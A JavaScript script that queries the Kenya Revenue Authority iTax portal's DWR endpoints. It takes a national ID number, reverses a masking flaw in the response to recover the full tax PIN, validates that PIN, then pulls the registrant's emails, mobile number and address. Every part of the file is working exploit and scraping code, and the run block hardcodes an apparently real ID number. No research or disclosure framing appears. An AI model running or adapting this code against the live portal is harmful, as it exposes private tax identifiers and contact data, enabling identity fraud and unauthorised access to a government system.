const https = require('https');

async function findPinByIdDirect(idNumber) {
    const cookies = await initSession();
    const scriptSessionId = generateScriptSessionId();
    const windowName = generateWindowName();

    const maskedResponse = await callDWR({
        cookies,
        scriptSessionId,
        windowName,
        scriptName: 'findPinByIdno',
        methodName: 'findPinByIdnumber',
        params: [`string:${idNumber}`],
        batchId: 0
    });

    if (maskedResponse && maskedResponse.includes('#$')) {
        const [maskedPin, reversedDigits] = maskedResponse.split('#$');
        const actualDigits = reversedDigits.split('').reverse().join('');
        const fullPin = maskedPin.replace('*****', actualDigits);

        const validation = await callDWR({
            cookies,
            scriptSessionId,
            windowName,
            scriptName: 'CheckLoginPin',
            methodName: 'checkLoginPin',
            params: [`string:${fullPin}`],
            batchId: 1
        });

        // Fetch manufacturer details using the extracted PIN
        const manufacturerDetails = await fetchManufacturerDetails(fullPin, cookies, scriptSessionId, windowName);

        return {
            fullPin,
            validation,
            idNumber,
            manufacturerDetails
        };
    }

    return { error: 'Invalid response format' };
}

async function fetchManufacturerDetails(pin, cookies, scriptSessionId, windowName) {
    const KRA_API_URL = 'https://itax.kra.go.ke/KRA-Portal/manufacturerAuthorizationController.htm?actionCode=fetchManDtl';

    return new Promise((resolve, reject) => {
        const cookieString = Object.entries(cookies)
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');

        const body = `manPin=${encodeURIComponent(pin)}`;

        const options = {
            hostname: 'itax.kra.go.ke',
            port: 443,
            path: '/KRA-Portal/manufacturerAuthorizationController.htm?actionCode=fetchManDtl',
            method: 'POST',
            headers: {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Content-Length': Buffer.byteLength(body),
                'Cookie': cookieString,
                'Referer': 'https://itax.kra.go.ke/KRA-Portal/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const parsedData = JSON.parse(data);

                    if (parsedData && parsedData.timsManBasicRDtlDTO) {
                        const formatted = {
                            basic: {
                                manufacturerName: parsedData.timsManBasicRDtlDTO?.manufacturerName || '',
                                registrationNumber: parsedData.timsManBasicRDtlDTO?.manufacturerBrNo || '',
                                pin: pin
                            },
                            business: {
                                businessName: parsedData.manBusinessRDtlDTO?.businessName || '',
                                registrationDate: parsedData.manBusinessRDtlDTO?.businessRegDate || '',
                                commencementDate: parsedData.manBusinessRDtlDTO?.businessComDate || ''
                            },
                            contact: {
                                mainEmail: parsedData.manContactRDtlDTO?.mainEmail || '',
                                secondaryEmail: parsedData.manContactRDtlDTO?.secondaryEmail || '',
                                mobileNumber: parsedData.manContactRDtlDTO?.mobileNo || ''
                            },
                            address: {
                                descriptive: parsedData.manAddRDtlDTO?.descriptiveAddress || '',
                                buildingNumber: parsedData.manAddRDtlDTO?.buldgNo || '',
                                streetRoad: parsedData.manAddRDtlDTO?.streetRoad || '',
                                cityTown: parsedData.manAddRDtlDTO?.cityTown || '',
                                county: parsedData.manAddRDtlDTO?.county || '',
                                district: parsedData.manAddRDtlDTO?.district || '',
                                town: parsedData.manAddRDtlDTO?.town || '',
                                lrNumber: parsedData.manAddRDtlDTO?.lrNo || '',
                                postalCode: parsedData.manAddRDtlDTO?.postalCode || '',
                                poBox: parsedData.manAddRDtlDTO?.poBox || '',
                                taxArea: parsedData.manAddRDtlDTO?.taxAreaLocality || '',
                                jurisdictionStationId: parsedData.manAddRDtlDTO?.jurisdictionStationId || '',
                                locationId: parsedData.manAddRDtlDTO?.locationId || ''
                            },
                            raw: parsedData
                        };

                        resolve(formatted);
                    } else {
                        resolve({ error: 'No manufacturer details found', raw: parsedData });
                    }
                } catch (parseError) {
                    resolve({ error: 'Failed to parse manufacturer details', raw: data });
                }
            });
        });

        req.on('error', (error) => {
            resolve({ error: error.message });
        });

        req.write(body);
        req.end();
    });
}

function initSession() {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'itax.kra.go.ke',
            port: 443,
            path: '/KRA-Portal/',
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const req = https.request(options, (res) => {
            const cookies = res.headers['set-cookie'] || [];
            const cookieMap = {};

            cookies.forEach(cookie => {
                const [nameValue] = cookie.split(';');
                const [name, value] = nameValue.split('=');
                cookieMap[name] = value;
            });

            resolve(cookieMap);
        });

        req.on('error', reject);
        req.end();
    });
}

function callDWR({ cookies, scriptSessionId, windowName, scriptName, methodName, params, batchId }) {
    return new Promise((resolve, reject) => {
        const cookieString = Object.entries(cookies)
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');

        const body = [
            'callCount=1',
            `windowName=${windowName}`,
            `c0-scriptName=${scriptName}`,
            `c0-methodName=${methodName}`,
            'c0-id=0',
            ...params.map((p, i) => `c0-param${i}=${p}`),
            `batchId=${batchId}`,
            'page=/KRA-Portal/',
            'httpSessionId=',
            `scriptSessionId=${scriptSessionId}`
        ].join('\n') + '\n';

        const options = {
            hostname: 'itax.kra.go.ke',
            port: 443,
            path: `/KRA-Portal/dwr/call/plaincall/${scriptName}.${methodName}.dwr`,
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
                'Content-Length': Buffer.byteLength(body),
                'Cookie': cookieString,
                'Referer': 'https://itax.kra.go.ke/KRA-Portal/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const result = parseDWRResponse(data);
                resolve(result);
            });
        });

        req.on('error', reject);
        req.write(body);
        req.end();
    });
}

function parseDWRResponse(response) {
    // Parse DWR callback format: dwr.engine.remote.handleCallback("0","0","VALUE");
    const callbackMatch = response.match(/handleCallback\([^,]+,[^,]+,"([^"]+)"\)/);
    if (callbackMatch) return callbackMatch[1];

    // Fallback for string variable format: s0="VALUE"
    const stringMatch = response.match(/s\d+="([^"]+)"/);
    return stringMatch ? stringMatch[1] : null;
}

function generateScriptSessionId() {
    const random = Math.random().toString(16).slice(2).toUpperCase();
    const timestamp = Date.now();
    return `${random}/${timestamp}`;
}

function generateWindowName() {
    return 'DWR-' + Math.random().toString(16).slice(2).toUpperCase();
}

// Run
(async () => {
    try {
        const result = await findPinByIdDirect('37708940');
        if (result.fullPin) {
            console.log(JSON.stringify(result, null, 2));
        } else {
            console.error('Error:', result.error);
        }
    } catch (error) {
        console.error('Error:', error.message);
    }
})();
